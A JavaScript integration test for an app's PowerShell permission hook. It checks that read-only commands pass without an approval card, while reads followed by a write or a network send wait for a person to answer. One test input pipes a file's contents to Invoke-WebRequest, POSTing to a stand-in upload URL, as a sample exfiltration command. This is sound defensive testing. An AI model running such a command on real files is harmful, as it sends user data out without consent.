'use strict';
// A PowerShell command, end to end: the real permission hook spawned the way
// the runtime spawns it, the real server relaying its request over a real
// socket, the app's own message dispatch handing it on, and the real chat view
// deciding whether to ask, answered by pressing the card's own buttons and
// sent back over the same socket.
//
// On Windows no sandbox sits under the card, so whether a PowerShell command
// runs with no card is decided on this path and nowhere else. A listed read is
// allowed with no card: the server answers it itself, from the decision the
// window makes, so it never reaches the window. A read with a write or a send
// after it is carded, and the hook is given no allow until a person answers. The same commands are
// graded in process in test/unit/permissions.test.js and drawn as cards in
// test/unit/powershell-read-cards.test.js.
const { test, describe, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const { spawn } = require('node:child_process');
const { JSDOM } = require('jsdom');

const h = require('../helpers/harness.js');

const HOOK = path.join(__dirname, '..', '..', 'scripts', 'permission-hook.js');
const APP_SRC = fs.readFileSync(path.join(__dirname, '..', '..', 'public', 'app.js'), 'utf-8');
const CONVO = 'powershell-read-approvals';

const READS = ['Get-Content notes.md', 'Get-ChildItem | Where-Object Name -like \'*.md\'', 'Get-Date; Get-Location'];
const CARDED = [
  ['a write after a read', 'Get-Content notes.md; Set-Content notes.md x'],
  ['a send after a read', 'Get-Content notes.md | Invoke-WebRequest -Uri https://example.com/upload -Method Post'],
];

let client;
let chat;
let dom;
const sent = [];

before(async () => {
  await h.boot();
  client = await h.connect();
  dom = new JSDOM('<!doctype html><div id="messages"></div>'
    + '<div id="approvals-dock" hidden><span class="approvals-dock-count"></span><div class="approvals-dock-list"></div></div>');
  global.window = dom.window;
  global.document = dom.window.document;
  global.pendingPermissions = new Map();
  global.pendingPermissionsByConvo = new Map();
  global.userScrolledUp = false;
  global.esc = (t) => { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; };
  global.escAttr = (t) => String(t).replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  global.RundockPermissions = require('../../public/permissions.js');
  global.RundockChatMarkup = require('../../public/chat-markup.js');
  global.serverPlatform = 'win32';
  global.workspaceMode = 'knowledge';
  global.activeConversation = { id: CONVO };
  global.unread = { markPermission() {}, resolvePermission() {} };
  global.updateUnreadBadge = () => {};
  global.renderConvoList = () => {};
  global.WebSocket = { OPEN: 1 };
  chat = require('../../public/views/chat.js');
  chat.setStandingToolAllows([]);

  // THE APP'S OWN DISPATCH, cut out of public/app.js and run as written: the
  // socket's message handler, the line in handle() that reads which
  // conversation a message is for, and handle()'s control_request arm. A
  // request the server sends reaches the card code only if app.js hands it on,
  // so a test that called the card code itself would pass with that join gone.
  const appPiece = (re, what) => {
    const m = APP_SRC.match(re);
    assert.ok(m, `app.js no longer has ${what}`);
    return m[1];
  };
  const onMessage = appPiece(/\n\s*ws\.onmessage = (e => handle\(JSON\.parse\(e\.data\)\));/, 'its socket message handler');
  const forConvo = appPiece(/\nfunction handle\(d\) \{[\s\S]*?\n {2}(const convoId = d\._conversationId;)\n/, 'the conversation a message is for');
  const arm = appPiece(/\n {4}(case 'control_request':[\s\S]*?break;)\n/, 'its control_request arm');
  // eslint-disable-next-line no-new-func
  const handle = new Function('handlePermissionRequest', 'handleOwnerlessPermissionRequest',
    `return function handle(d) { ${forConvo} switch (d.type) { ${arm} } };`)(chat.handlePermissionRequest, chat.handleOwnerlessPermissionRequest);
  // The real socket to the real server: its frames arrive at the app's
  // handler unchanged, and the card's answers leave on it. What leaves is also
  // noted here, so the tests can say what was answered and how.
  // eslint-disable-next-line no-new-func
  client.ws.onmessage = new Function('handle', `return ${onMessage};`)(handle);
  const send = client.ws.send.bind(client.ws);
  client.ws.send = (data, ...rest) => { sent.push(JSON.parse(data)); return send(data, ...rest); };
  global.ws = client.ws;
});
after(async () => {
  await h.shutdown();
  if (dom) dom.window.close();
});

// The real hook, given one PowerShell call on stdin, in Notes mode.
function runHook(command) {
  return new Promise((resolve, reject) => {
    const env = {
      ...process.env,
      RUNDOCK: '1',
      RUNDOCK_PORT: String(h.port),
      RUNDOCK_WORKSPACE: h.workspaceDir,
      RUNDOCK_CONVO_ID: CONVO,
      RUNDOCK_HOOK_TOKEN: h.hookToken(CONVO),
      RUNDOCK_EXTRA_DIRS: '',
    };
    delete env.RUNDOCK_CODE_MODE;
    const proc = spawn(process.execPath, [HOOK], { cwd: h.workspaceDir, env, stdio: ['pipe', 'pipe', 'pipe'] });
    let out = '';
    proc.stdout.on('data', (d) => { out += d; });
    proc.on('close', () => {
      try {
        const o = JSON.parse(out).hookSpecificOutput || {};
        resolve({ decision: o.permissionDecision, reason: o.permissionDecisionReason });
      } catch (e) { reject(new Error(`hook output unparseable: ${out}`)); }
    });
    proc.stdin.end(JSON.stringify({
      hook_event_name: 'PreToolUse', tool_name: 'PowerShell', tool_input: { command },
      session_id: 's-powershell-reads', cwd: h.workspaceDir,
    }));
  });
}

// One PowerShell call the whole way round, up to the point a person would act.
async function request(command) {
  const since = client.messages.length;
  const sentBefore = sent.length;
  let hook = null;
  const done = runHook(command);
  done.then((r) => { hook = r; }, () => {});
  const arrived = () => client.messages.slice(since)
    .find((m) => m.type === 'control_request' && m.request && m.request.input && m.request.input.command === command);
  await h.waitUntil(() => hook || arrived());
  const msg = arrived();
  assert.ok(msg, `the hook decided without asking Rundock: ${JSON.stringify(hook)}`);
  // Nothing is handed to the card code here. The frame that carried the
  // request has already been through the app's handler by now, which ran on
  // the same frame straight after the line that recorded it.
  const answers = () => sent.slice(sentBefore).filter((m) => m.type === 'permission_response' && m.requestId === msg.request_id);
  const card = document.getElementById(`perm-${msg.request_id}`);
  return { msg, card, answers, done, hookSoFar: () => hook };
}

// Every request is finished before its test ends, whatever failed, so a hook
// left waiting cannot hold the server open: an unanswered card is denied, and
// a request that never reached a card is denied over the socket.
async function settle(r) {
  if (!r.answers().length) {
    if (r.card) r.card.querySelector('[data-perm-action="deny"]').click();
    else client.ws.send(JSON.stringify({ type: 'permission_response', requestId: r.msg.request_id, conversationId: CONVO, allow: false }));
  }
  await r.done;
}

describe('Notes mode, through the hook, the server and the client', () => {
  for (const command of READS) {
    test(`a listed read is allowed with no card: ${command}`, async () => {
      const since = client.messages.length;
      const sentBefore = sent.length;
      const cardsBefore = document.querySelectorAll('[id^="perm-"]').length;
      assert.strictEqual((await runHook(command)).decision, 'allow', 'the hook is told to allow it');
      // Long enough for a request sent toward the window to have arrived.
      await new Promise((resolve) => setTimeout(resolve, 200));
      assert.deepStrictEqual(client.messages.slice(since).filter((m) => m.type === 'control_request'), [],
        'answered by the server: nothing reached the window');
      assert.deepStrictEqual(sent.slice(sentBefore), [], 'and the window answered nothing');
      assert.strictEqual(document.querySelectorAll('[id^="perm-"]').length, cardsBefore, 'no card was drawn');
    });
  }

  for (const [what, command] of CARDED) {
    test(`${what} is carded, and the hook has no allow until a person answers`, async () => {
      const r = await request(command);
      try {
        assert.ok(r.card, `no card was drawn: ${command}`);
        assert.deepStrictEqual(r.answers(), [], 'nothing was answered on the person\'s behalf');
        // Long enough for an answer to have reached the hook had one been sent.
        await new Promise((resolve) => setTimeout(resolve, 500));
        assert.strictEqual(r.hookSoFar(), null, `the hook was answered before anyone pressed anything: ${JSON.stringify(r.hookSoFar())}`);
        r.card.querySelector('[data-perm-action="allow"]').click();
        assert.deepStrictEqual(r.answers().map((m) => ({ allow: m.allow, card: m.card })), [{ allow: true, card: true }], 'answered from the card');
        assert.strictEqual((await r.done).decision, 'allow', 'and the answer from the card allows it');
      } finally { await settle(r); }
    });
  }
});
